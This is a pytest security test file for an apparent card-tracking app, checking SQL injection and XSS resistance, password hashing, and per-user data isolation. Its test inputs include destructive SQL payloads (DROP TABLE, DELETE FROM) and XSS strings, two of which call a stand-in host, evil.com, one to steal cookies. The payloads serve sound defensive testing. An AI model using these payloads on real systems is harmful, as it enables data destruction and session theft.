"""Security tests - SQL injection and XSS prevention."""

import pytest
from datetime import datetime, date
from uuid import uuid4
import os

# Ensure DATABASE_URL is set for tests
os.environ.setdefault("DATABASE_URL", "postgresql://postgres:postgres@localhost:5432/churnpilot")

from src.core.auth import AuthService
from src.core.db_storage import DatabaseStorage
from src.core.models import SignupBonus
from src.core.database import get_cursor, check_connection
from src.core.library import get_template


def add_card_helper(storage, template_id, opened_date=None, signup_bonus=None):
    """Helper to add card from template ID."""
    template = get_template(template_id)
    if template is None:
        raise ValueError(f"Template not found: {template_id}")
    return storage.add_card_from_template(
        template=template,
        opened_date=opened_date or date.today(),
        signup_bonus=signup_bonus
    )


class TestDatabaseConnection:
    """Verify database is accessible for security tests."""

    def test_database_is_connected(self):
        """Database should be reachable."""
        assert check_connection() is True


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""

    @pytest.fixture
    def user_storage(self):
        auth = AuthService()
        email = f"security_test_{datetime.now().timestamp()}@test.com"
        user = auth.register(email, "TestPassword123!")
        return DatabaseStorage(user.id)

    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE users; --",
        "1; DELETE FROM cards WHERE 1=1; --",
        "' OR '1'='1",
        "'; UPDATE users SET email='hacked@test.com'; --",
        "Robert'); DROP TABLE students;--",
        "1' OR '1' = '1",
        "admin'--",
        "' UNION SELECT * FROM users --",
    ])
    def test_sql_injection_in_nickname(self, user_storage, malicious_input):
        """SQL injection in nickname should be safely stored as text."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.nickname = malicious_input
        user_storage.save_card(card)

        # Should store literally, not execute
        reloaded = user_storage.get_all_cards()[0]
        assert reloaded.nickname == malicious_input

        # Tables should still exist
        with get_cursor(commit=False) as cur:
            cur.execute("SELECT COUNT(*) as cnt FROM users")
            assert cur.fetchone()["cnt"] >= 1

    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE cards; --",
        "Test'); DELETE FROM signup_bonuses; --",
    ])
    def test_sql_injection_in_notes(self, user_storage, malicious_input):
        """SQL injection in notes should be safely stored as text."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.notes = malicious_input
        user_storage.save_card(card)

        reloaded = user_storage.get_all_cards()[0]
        assert reloaded.notes == malicious_input

        # Cards table should still exist
        with get_cursor(commit=False) as cur:
            cur.execute("SELECT COUNT(*) as cnt FROM cards")
            assert cur.fetchone()["cnt"] >= 1

    def test_sql_injection_in_email_registration(self):
        """SQL injection in email during registration should fail safely."""
        auth = AuthService()
        malicious_email = "test@test.com'; DROP TABLE users; --"

        # Should either reject as invalid email or store safely
        try:
            user = auth.register(malicious_email, "TestPassword123!")
            # If it didn't raise, the email was sanitized or stored safely
            # Tables should still exist
            with get_cursor(commit=False) as cur:
                cur.execute("SELECT COUNT(*) as cnt FROM users")
                assert cur.fetchone()["cnt"] >= 1
        except ValueError:
            # Invalid email rejected - this is also acceptable
            pass

    def test_sql_injection_in_login(self):
        """SQL injection in login should fail safely."""
        auth = AuthService()

        # Try SQL injection in email
        result = auth.login("' OR '1'='1' --", "TestPassword123!")
        assert result is None  # Should not return any user

        # Try SQL injection in password
        email = f"sqli_login_{datetime.now().timestamp()}@test.com"
        user = auth.register(email, "TestPassword123!")

        result = auth.login(email, "' OR '1'='1' --")
        assert result is None  # Should not bypass password check


class TestXSSPrevention:
    """Test XSS is handled safely (stored as text)."""

    @pytest.fixture
    def user_storage(self):
        auth = AuthService()
        email = f"xss_test_{datetime.now().timestamp()}@test.com"
        user = auth.register(email, "TestPassword123!")
        return DatabaseStorage(user.id)

    @pytest.mark.parametrize("xss_input", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "<div onclick=alert('xss')>click me</div>",
        "'\"><script>alert('xss')</script>",
    ])
    def test_xss_in_nickname_stored_safely(self, user_storage, xss_input):
        """XSS in nickname should be stored as text (escaped on render by Streamlit)."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.nickname = xss_input
        user_storage.save_card(card)

        reloaded = user_storage.get_all_cards()[0]
        # Should be stored literally
        assert reloaded.nickname == xss_input

    @pytest.mark.parametrize("xss_input", [
        "<script>document.location='http://evil.com?c='+document.cookie</script>",
        "<img src='x' onerror='fetch(\"http://evil.com\")'>",
    ])
    def test_xss_in_notes_stored_safely(self, user_storage, xss_input):
        """XSS in notes should be stored as text."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.notes = xss_input
        user_storage.save_card(card)

        reloaded = user_storage.get_all_cards()[0]
        assert reloaded.notes == xss_input


class TestPasswordSecurity:
    """Test password security practices."""

    def test_passwords_are_hashed(self):
        """Passwords should never be stored in plain text."""
        auth = AuthService()
        email = f"hash_test_{datetime.now().timestamp()}@test.com"
        password = "MySecretPassword123!"

        user = auth.register(email, password)

        # Check database directly
        with get_cursor(commit=False) as cur:
            cur.execute("SELECT password_hash FROM users WHERE id = %s", (str(user.id),))
            row = cur.fetchone()

        # Password hash should NOT equal the plain password
        assert row["password_hash"] != password
        # Should be a bcrypt hash (starts with $2)
        assert row["password_hash"].startswith("$2")

    def test_different_users_same_password_different_hash(self):
        """Same password should produce different hashes (salted)."""
        auth = AuthService()
        password = "SamePassword123!"

        user1 = auth.register(f"hash1_{datetime.now().timestamp()}@test.com", password)
        user2 = auth.register(f"hash2_{datetime.now().timestamp()}@test.com", password)

        with get_cursor(commit=False) as cur:
            cur.execute("SELECT password_hash FROM users WHERE id = %s", (str(user1.id),))
            hash1 = cur.fetchone()["password_hash"]

            cur.execute("SELECT password_hash FROM users WHERE id = %s", (str(user2.id),))
            hash2 = cur.fetchone()["password_hash"]

        # Hashes should be different due to random salt
        assert hash1 != hash2


class TestAuthorizationSecurity:
    """Test authorization security."""

    def test_user_cannot_access_other_user_data_via_storage(self):
        """Storage should only return data for the authenticated user."""
        auth = AuthService()

        # Create user A with data
        user_a = auth.register(f"auth_a_{datetime.now().timestamp()}@test.com", "TestPassword123!")
        storage_a = DatabaseStorage(user_a.id)
        card_a = add_card_helper(storage_a, "chase_sapphire_preferred")
        card_a.nickname = "Secret Card A"
        storage_a.save_card(card_a)

        # Create user B
        user_b = auth.register(f"auth_b_{datetime.now().timestamp()}@test.com", "TestPassword123!")
        storage_b = DatabaseStorage(user_b.id)

        # User B should not see user A's card
        cards_b = storage_b.get_all_cards()
        for card in cards_b:
            assert card.nickname != "Secret Card A"

    def test_storage_respects_user_id_boundary(self):
        """Storage operations should be scoped to user_id."""
        auth = AuthService()

        user_a = auth.register(f"boundary_a_{datetime.now().timestamp()}@test.com", "TestPassword123!")
        user_b = auth.register(f"boundary_b_{datetime.now().timestamp()}@test.com", "TestPassword123!")

        storage_a = DatabaseStorage(user_a.id)
        storage_b = DatabaseStorage(user_b.id)

        # Each user adds a card
        card_a = add_card_helper(storage_a, "chase_sapphire_preferred")
        card_b = add_card_helper(storage_b, "amex_gold")

        # Verify counts
        assert len(storage_a.get_all_cards()) == 1
        assert len(storage_b.get_all_cards()) == 1

        # Verify no cross-contamination
        cards_a = storage_a.get_all_cards()
        cards_b = storage_b.get_all_cards()

        a_ids = {c.id for c in cards_a}
        b_ids = {c.id for c in cards_b}

        assert len(a_ids & b_ids) == 0  # No overlap


class TestInputSanitization:
    """Test input sanitization."""

    @pytest.fixture
    def user_storage(self):
        auth = AuthService()
        email = f"sanitize_test_{datetime.now().timestamp()}@test.com"
        user = auth.register(email, "TestPassword123!")
        return DatabaseStorage(user.id)

    def test_null_bytes_handled(self, user_storage):
        """Null bytes in input should be handled."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")

        # Try to save with null byte
        try:
            card.nickname = "Test\x00Null"
            user_storage.save_card(card)
            # If it saved, verify it doesn't corrupt data
            reloaded = user_storage.get_all_cards()[0]
            assert reloaded.nickname is not None
        except Exception:
            # Rejecting null bytes is also acceptable
            pass

    def test_backslash_handled(self, user_storage):
        """Backslashes should be stored correctly."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.nickname = "Test\\Path\\Name"
        user_storage.save_card(card)

        reloaded = user_storage.get_all_cards()[0]
        assert "\\" in reloaded.nickname

    def test_quotes_handled(self, user_storage):
        """Various quote characters should be stored correctly."""
        card = add_card_helper(user_storage, "chase_sapphire_preferred")
        card.nickname = "Test'Single\"Double`Backtick"
        user_storage.save_card(card)

        reloaded = user_storage.get_all_cards()[0]
        assert "'" in reloaded.nickname
        assert '"' in reloaded.nickname
        assert "`" in reloaded.nickname
